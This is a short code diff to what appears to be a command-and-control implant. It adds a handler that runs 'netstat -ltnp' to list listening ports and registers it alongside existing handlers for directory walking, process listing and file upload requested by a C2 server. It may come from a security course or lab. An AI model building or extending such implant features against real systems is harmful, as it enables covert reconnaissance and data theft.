@@ -1,4 +1,5 @@
 import os
+import subprocess
 from protocol.common import *
 
 
@@ -134,6 +135,14 @@ def list_running_processes():
     return MESSAGE_STATUS_OK, response
 
 
+def list_listening_tcp_ports():
+    # Will list listening TCP ports and their processes
+    response = f"* Listening TCP ports: *\n\n"
+    result = subprocess.run(['netstat', '-ltnp'], capture_output=True, text=True)
+    response += result.stdout
+    response += "\n*Listening TCP ports*\n"
+    return MESSAGE_STATUS_OK, response
+
 
 # functions to handle the command request from C2
 # receive arguments
@@ -143,6 +152,7 @@ command_id_to_command_handler = {
     WALKDIR_COMMAND_ID: walk_dir,
     RUNNING_PROCESSES_COMMAND_ID: list_running_processes,
     FILE_UPLOAD_COMMAND_ID: read_file,
+    NETWORK_CONNECTIONS_COMMAND_ID: list_listening_tcp_ports,
 }
 
 # todo: #to-fill
